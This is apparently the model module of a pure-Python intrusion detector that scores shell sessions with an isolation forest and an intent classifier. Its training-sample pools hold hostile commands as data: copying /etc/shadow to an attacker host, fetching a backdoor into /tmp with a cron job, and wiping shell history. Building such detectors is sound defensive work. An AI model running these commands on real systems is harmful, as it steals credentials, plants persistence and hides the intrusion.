"""
core/model.py — 3-Layer Hybrid AI Engine
Zero external libraries. Pure Python stdlib: math, random, json, pickle, os.

Layer 1 — Isolation Forest        (pure Python)
Layer 2 — Sequence Attack Score    (computed in features.py)
Layer 3 — Intent Classifier        (pure Python Logistic Regression)
"""

import os, json, pickle, glob, math, random
from typing import Dict, List, Tuple, Optional
from core.features import extract_features, to_vector, FEATURE_NAMES, MIN_COMMANDS

MODEL_DIR    = "models"
IF_PATH      = os.path.join(MODEL_DIR, "isolation_forest.pkl")
SCALER_PATH  = os.path.join(MODEL_DIR, "scaler.pkl")
PROFILE_PATH = os.path.join(MODEL_DIR, "profile.json")
INTENT_PATH  = os.path.join(MODEL_DIR, "intent_clf.pkl")

INTENT_LABELS = [
    "Normal", "Privilege Escalation", "Data Exfiltration",
    "System Reconnaissance", "Lateral Movement",
    "Persistence / Backdoor", "Anti-Forensics",
]

_MIN_STD = {
    "pipe_rate": 0.02, "redirect_rate": 0.02,
    "priv_net_combo": 0.01, "recon_priv_combo": 0.50,
    "exfil_rate": 0.005, "cleanup_rate": 0.005,
}

# ── Pure Python math helpers ──────────────────────────────────────────────────
def _mean(col):
    return sum(col) / len(col) if col else 0.0

def _std(col, mean):
    if len(col) < 2: return 1e-9
    return math.sqrt(sum((v - mean)**2 for v in col) / len(col)) + 1e-9

def _percentile(col, p):
    s = sorted(col); n = len(s)
    if n == 0: return 0.0
    idx = p / 100.0 * (n - 1)
    lo = int(idx); hi = min(lo + 1, n - 1)
    return s[lo] * (1 - idx + lo) + s[hi] * (idx - lo)

def _dot(w, x):
    return sum(wi * xi for wi, xi in zip(w, x))

def _softmax(z):
    m = max(z); e = [math.exp(v - m) for v in z]; s = sum(e)
    return [v / s for v in e]

# ── Robust Scaler (pure Python IQR) ──────────────────────────────────────────
class RobustScaler:
    def __init__(self): self.medians = []; self.iqrs = []
    def fit(self, X):
        n = len(X[0]) if X else 0
        self.medians, self.iqrs = [], []
        for j in range(n):
            col = [r[j] for r in X]
            self.medians.append(_percentile(col, 50))
            self.iqrs.append(max(_percentile(col, 75) - _percentile(col, 25), 1e-9))
    def transform(self, X):
        return [[(X[i][j] - self.medians[j]) / self.iqrs[j]
                 for j in range(len(X[i]))] for i in range(len(X))]
    def fit_transform(self, X):
        self.fit(X); return self.transform(X)

# ── Isolation Tree nodes ──────────────────────────────────────────────────────
class _INode:
    __slots__ = ("left","right","feat","val","size","leaf")
    def __init__(self):
        self.left = self.right = None
        self.feat = -1; self.val = 0.0; self.size = 0; self.leaf = False

def _avg_path(n):
    if n <= 1: return 0.0
    return 2.0*(math.log(n-1)+0.5772156649) - 2.0*(n-1)/n

def _build(X, idx, depth, max_d, rng):
    node = _INode(); node.size = len(idx)
    if len(idx) <= 1 or depth >= max_d: node.leaf = True; return node
    feat = rng.randint(0, len(X[0])-1)
    vals = [X[i][feat] for i in idx]
    lo, hi = min(vals), max(vals)
    if lo == hi: node.leaf = True; return node
    split = rng.uniform(lo, hi)
    node.feat = feat; node.val = split
    node.left  = _build(X, [i for i in idx if X[i][feat] <  split], depth+1, max_d, rng)
    node.right = _build(X, [i for i in idx if X[i][feat] >= split], depth+1, max_d, rng)
    return node

def _path_len(node, x, d):
    if node.leaf: return d + _avg_path(node.size)
    return _path_len(node.left, x, d+1) if x[node.feat] < node.val else _path_len(node.right, x, d+1)

# ── Isolation Forest ──────────────────────────────────────────────────────────
class IsolationForest:
    def __init__(self, n_estimators=200, max_samples=256, contamination=0.05, random_state=42):
        self.n_estimators = n_estimators; self.max_samples = max_samples
        self.contamination = contamination; self.seed = random_state
        self.trees = []; self.sub = 0; self.threshold = 0.0

    def fit(self, X):
        n = len(X); self.sub = min(self.max_samples, n)
        max_d = math.ceil(math.log2(max(self.sub, 2)))
        rng = random.Random(self.seed); self.trees = []
        for _ in range(self.n_estimators):
            idx = rng.sample(range(n), self.sub)
            self.trees.append(_build(X, idx, 0, max_d, rng))
        scores = self._scores(X)
        srt = sorted(scores, reverse=True)
        self.threshold = srt[min(int(len(srt)*(1-self.contamination)), len(srt)-1)]

    def _scores(self, X):
        c = _avg_path(self.sub)
        return [2**(-(sum(_path_len(t,x,0) for t in self.trees)/len(self.trees))/c)
                if c > 0 else 0.5 for x in X]

    def decision_function(self, X): return self._scores(X)
    def predict(self, X): return [1 if s <= self.threshold else -1 for s in self._scores(X)]

# ── Logistic Regression Intent Classifier (pure Python) ──────────────────────
class LogisticRegression:
    def __init__(self, lr=0.05, n_iter=600, l2=0.01, seed=42):
        self.lr = lr; self.n_iter = n_iter; self.l2 = l2
        self.rng = random.Random(seed); self.W = []; self.classes = []

    def fit(self, X, y):
        self.classes = sorted(set(y)); K = len(self.classes); D = len(X[0])
        c2i = {c: i for i, c in enumerate(self.classes)}
        self.W = [[self.rng.gauss(0, 0.01) for _ in range(D+1)] for _ in range(K)]
        for step in range(self.n_iter):
            lr = self.lr / (1 + 0.002*step)
            order = list(range(len(X))); self.rng.shuffle(order)
            for idx in order:
                xi = X[idx]; yi = c2i[y[idx]]
                logits = [self.W[k][0] + _dot(self.W[k][1:], xi) for k in range(K)]
                probs = _softmax(logits)
                for k in range(K):
                    e = probs[k] - (1.0 if k == yi else 0.0)
                    self.W[k][0] -= lr * e
                    for j in range(D):
                        self.W[k][j+1] -= lr*(e*xi[j] + self.l2*self.W[k][j+1])

    def predict_proba(self, x):
        logits = [self.W[k][0] + _dot(self.W[k][1:], x) for k in range(len(self.classes))]
        probs = _softmax(logits)
        return {c: round(p, 4) for c, p in zip(self.classes, probs)}

    def predict(self, x):
        p = self.predict_proba(x); return max(p, key=p.get)

# ── Intent training data ──────────────────────────────────────────────────────
def _make_intent_samples(normal_feats, rng):
    from core.data_gen import NORMAL_DEV_COMMANDS, ATTACKER_COMMANDS
    X, y = [], []
    for f in normal_feats:
        X.append(to_vector(f)); y.append(0)
    pools = {
        1: ["sudo su","sudo -l","pkexec bash","sudo cat /etc/shadow","sudo bash"],
        2: ["scp /etc/shadow attacker@10.0.0.1:/loot/","rsync -avz /home/ bad@x::b","sftp bad@x"],
        3: ["whoami","id","uname -a","hostname","cat /etc/passwd","ps aux","netstat -tulpn"],
        4: ["nmap -sV 192.168.1.0/24","ssh user@192.168.1.10","arp -a"],
        5: ["echo '* * * * * /tmp/bd'|crontab -","chmod +x /tmp/bd","wget http://x/bd -O /tmp/bd"],
        6: ["history -c","unset HISTFILE","shred -u ~/.bash_history","export HISTSIZE=0"],
    }
    for label, pool in pools.items():
        for _ in range(14):
            n = rng.randint(20, 70)
            f = extract_features("\n".join(rng.choice(pool) for _ in range(n)))
            X.append(to_vector(f)); y.append(label)
    for _ in range(10):
        normal = [rng.choice(NORMAL_DEV_COMMANDS) for _ in range(50)]
        attack = [rng.choice(ATTACKER_COMMANDS) for _ in range(20)]
        mixed = normal + attack; rng.shuffle(mixed)
        f = extract_features("\n".join(mixed))
        X.append(to_vector(f)); y.append(3)
    return X, y

def _train_intent_clf(normal_feats):
    rng = random.Random(42)
    X, y = _make_intent_samples(normal_feats, rng)
    clf = LogisticRegression(lr=0.05, n_iter=600, l2=0.01, seed=42)
    clf.fit(X, y)
    print(f"  [Intent] Trained on {len(X)} samples / {len(set(y))} classes")
    return clf

# ── Training ──────────────────────────────────────────────────────────────────
def train(data_dir="data"):
    files = sorted(glob.glob(os.path.join(data_dir, "normal", "normal_session_*.txt")))
    if not files:
        raise FileNotFoundError(f"No normal sessions in {data_dir}/normal/")
    normal_feats = []
    for path in files:
        raw = open(path).read()
        f = extract_features(raw)
        if f["_n"] >= MIN_COMMANDS:
            normal_feats.append(f)
            print(f"  [+] {os.path.basename(path):40s}  n={f['_n']:>4}  bucket={f['_bucket']}")
        else:
            print(f"  [skip] {os.path.basename(path)} — {f['_n']} commands")
    if len(normal_feats) < 3:
        raise ValueError("Need at least 3 usable normal sessions.")
    X_raw = [to_vector(f) for f in normal_feats]
    print(f"\n  [*] Training Isolation Forest ({len(normal_feats)} sessions)...")
    scaler = RobustScaler(); X_sc = scaler.fit_transform(X_raw)
    iso = IsolationForest(n_estimators=200, max_samples=min(256,len(X_sc)),
                           contamination=0.05, random_state=42)
    iso.fit(X_sc)
    profile = {}
    for j, name in enumerate(FEATURE_NAMES):
        col = [r[j] for r in X_raw]; mn = _mean(col); sd = max(_std(col,mn), _MIN_STD.get(name,1e-9))
        profile[name] = {"mean":round(mn,8),"std":round(sd,8),"min":round(min(col),8),"max":round(max(col),8)}
    profile["_meta"] = {"n_training_sessions":len(normal_feats),"feature_names":FEATURE_NAMES}
    print("\n  [*] Training Intent Classifier (pure Python LR)...")
    clf = _train_intent_clf(normal_feats)
    os.makedirs(MODEL_DIR, exist_ok=True)
    with open(IF_PATH,"wb") as f: pickle.dump(iso,f)
    with open(SCALER_PATH,"wb") as f: pickle.dump(scaler,f)
    with open(PROFILE_PATH,"w") as f: json.dump(profile,f,indent=2)
    with open(INTENT_PATH,"wb") as f: pickle.dump(clf,f)
    print(f"\n  [✓] Isolation Forest   → {IF_PATH}")
    print(f"  [✓] Scaler             → {SCALER_PATH}")
    print(f"  [✓] Profile            → {PROFILE_PATH}")
    print(f"  [✓] Intent Classifier  → {INTENT_PATH}")
    print(f"  [✓] {len(normal_feats)} sessions / {len(FEATURE_NAMES)} features")
    return {"n_sessions":len(normal_feats),"features":len(FEATURE_NAMES)}

# ── Load ──────────────────────────────────────────────────────────────────────
def load_model():
    with open(IF_PATH,"rb") as f: iso = pickle.load(f)
    with open(SCALER_PATH,"rb") as f: scaler = pickle.load(f)
    with open(PROFILE_PATH) as f: profile = json.load(f)
    clf = None
    if os.path.exists(INTENT_PATH):
        with open(INTENT_PATH,"rb") as f: clf = pickle.load(f)
    return iso, scaler, profile, clf

# ── Inference ─────────────────────────────────────────────────────────────────
def predict(raw_text, iso, scaler, profile, clf=None):
    features = extract_features(raw_text)
    n = features["_n"]; bkt = features["_bucket"]
    if n < MIN_COMMANDS:
        return {"status":"INSUFFICIENT_DATA","risk_level":"UNKNOWN","risk_score":0.0,
                "features":features,"deviations":{},"sig_devs":{},"if_score":None,
                "if_label":1,"if_risk":0.0,"seq_score":0.0,"seq_risk":0.0,
                "intent":"Normal","intent_probs":{},"intent_risk":0.0,
                "z_risk":0.0,"bucket":bkt,"n":n,
                "message":f"Only {n} commands — need at least {MIN_COMMANDS}."}
    vec = [to_vector(features)]; vec_sc = scaler.transform(vec)
    if_raw = iso.decision_function(vec_sc)[0]
    if_label = iso.predict(vec_sc)[0]
    if_risk = max(0.0, min(100.0, (if_raw - 0.4)*250))
    seq_score = features.get("sequence_attack_score", 0.0)
    seq_risk = min(100.0, seq_score * 100.0)
    intent_label = "Normal"; intent_probs = {}; intent_risk = 0.0
    if clf is not None:
        raw_probs = clf.predict_proba(to_vector(features))
        normal_prob = raw_probs.get(0, 0.0)
        intent_risk = (1.0 - normal_prob) * 100.0
        best = max(raw_probs, key=raw_probs.get)
        intent_label = INTENT_LABELS[best] if best < len(INTENT_LABELS) else "Normal"
        intent_probs = {INTENT_LABELS[k]: v for k, v in raw_probs.items() if k < len(INTENT_LABELS)}
    devs = {}
    for name in FEATURE_NAMES:
        val = features.get(name, 0.0)
        mean = profile.get(name, {}).get("mean", 0.0)
        std = max(profile.get(name, {}).get("std", 1.0), _MIN_STD.get(name, 1e-9))
        devs[name] = max(-10.0, min(10.0, (val - mean) / std))
    z_thresh = {"short":3.5,"medium":3.0}.get(bkt, 2.5)
    CRITICAL = ["sudo_rate","network_rate","recon_rate","exfil_rate","cleanup_rate","priv_net_combo","recon_priv_combo"]
    BEHAVIORAL = ["entropy_norm","unique_ratio","cmd_diversity_index"]
    sig_devs = {}
    for k in CRITICAL:
        if abs(devs.get(k,0.0)) >= z_thresh: sig_devs[k] = devs[k]
    for k in BEHAVIORAL:
        if abs(devs.get(k,0.0)) >= z_thresh+1.0: sig_devs[k] = devs[k]
    if list(sig_devs.keys()) == ["entropy_norm"]: sig_devs.clear()
    z_risk = min(100.0, len(sig_devs)*12.0 + sum(max(0.0,abs(v)-z_thresh)*6.0 for v in sig_devs.values()))
    if len(sig_devs) >= 2:
        risk = 0.30*if_risk + 0.25*seq_risk + 0.20*intent_risk + 0.25*z_risk
    else:
        risk = 0.45*if_risk + 0.25*seq_risk + 0.20*intent_risk + 0.10*z_risk
    force_normal = (if_label == 1 and not sig_devs and if_raw < 0.5 and seq_score < 0.05)
    if force_normal: risk = min(risk, 22.0)
    if "exfil_rate" in sig_devs or "cleanup_rate" in sig_devs: risk = max(risk, 62.0)
    if seq_score >= 0.30: risk = max(risk, 55.0)
    risk = round(min(100.0, max(0.0, risk)), 1)
    if force_normal or risk < 34.0: status, risk_level = "NORMAL", "LOW"
    elif risk < 50.0: status, risk_level = "SUSPICIOUS", "MEDIUM"
    else: status, risk_level = "ANOMALOUS", "HIGH"
    return {"status":status,"risk_level":risk_level,"risk_score":risk,
            "features":features,"deviations":devs,"sig_devs":sig_devs,
            "if_score":round(if_raw,4),"if_label":if_label,"if_risk":round(if_risk,1),
            "seq_score":round(seq_score,4),"seq_risk":round(seq_risk,1),
            "intent":intent_label,"intent_probs":intent_probs,"intent_risk":round(intent_risk,1),
            "z_risk":round(z_risk,1),"bucket":bkt,"n":n}

if __name__ == "__main__":
    train()
